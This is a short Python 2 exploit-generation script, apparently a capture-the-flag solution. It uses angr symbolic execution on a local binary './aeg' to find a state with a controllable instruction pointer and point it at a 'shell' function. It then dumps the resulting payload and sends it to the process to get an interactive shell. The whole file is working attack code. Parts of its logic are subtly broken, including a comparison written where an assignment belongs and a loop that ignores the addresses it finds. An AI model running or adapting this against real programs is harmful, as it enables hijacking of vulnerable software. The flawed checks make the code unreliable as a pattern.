import sys, os, logging
import angr
from angr import sim_options as so
from pwn import *

def check_symbolic(state, length):
	stdin = state.posix.get_file(0)
	sym_addrs = list()

	for i in stdin.variables():
		sym_addrs.extend(state.memory.addrs_for_name(i))

	for addr in sym_addrs:
		is_sym_addr = True

		for i in range(length):
			if not addr + i in sym_addrs:
				is_sym_addr = False
				break

		if is_sym_addr:
			yield addr

if __name__ == '__main__':
	p = angr.Project("./aeg", auto_load_libs=False)

	opts = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
	es = p.factory.entry_state(add_options=opts)
	sm = p.factory.simgr(es, save_unconstrained=True)

	addr = p.loader.find_symbol("shell").linked_addr
	print "[Addr] : 0x%x" % addr

	ex_state = None
	while ex_state is None:
		sm.step()
		if len(sm.unconstrained) == 0:
			continue
		for i in sm.unconstrained:
			is_symbolic = True

			for j in range(0, i.arch.bits):
				if not i.se.symbolic(i.regs.rip[j]):
					is_symbolic == False
					break

			if is_symbolic:
				ex_state = i

		sm.drop(stash='unconstrained')

	assert ex_state.se.symbolic(ex_state.regs.rip)

	for sym_addr in check_symbolic(ex_state,8):
		ex_state.add_constraints(ex_state.regs.rip == addr)

		if ex_state.satisfiable():
			break
		else:
			sys.exit(1)

	pay = ex_state.posix.dumps(0)
	print "---------Payload---------"
	print hexdump(pay)
	p = process("./aeg")
	p.sendline(pay)
	p.interactive()

